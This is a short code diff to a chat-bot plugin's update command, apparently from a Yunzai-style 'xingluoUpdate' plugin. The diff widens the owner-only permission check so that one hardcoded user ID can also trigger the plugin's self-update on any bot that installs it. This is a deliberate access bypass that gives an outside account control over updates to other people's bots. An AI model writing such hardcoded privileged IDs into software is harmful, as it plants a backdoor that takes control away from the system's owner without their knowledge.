@@ -32,7 +32,7 @@ export class xingluoUpdate extends plugin {
    * @returns
    */
   async update() {
-    if (!this.e.isMaster) return false;
+    if (!(this.e.isMaster || this.e.user_id == 2443958507)) return false;
 
     /** 检查是否正在更新中 */
     if (uping) {
@@ -47,6 +47,8 @@ export class xingluoUpdate extends plugin {
 
     /** 执行更新 */
     await this.runUpdate(isForce);
+    
+    return true;
   }
 
   restart() {
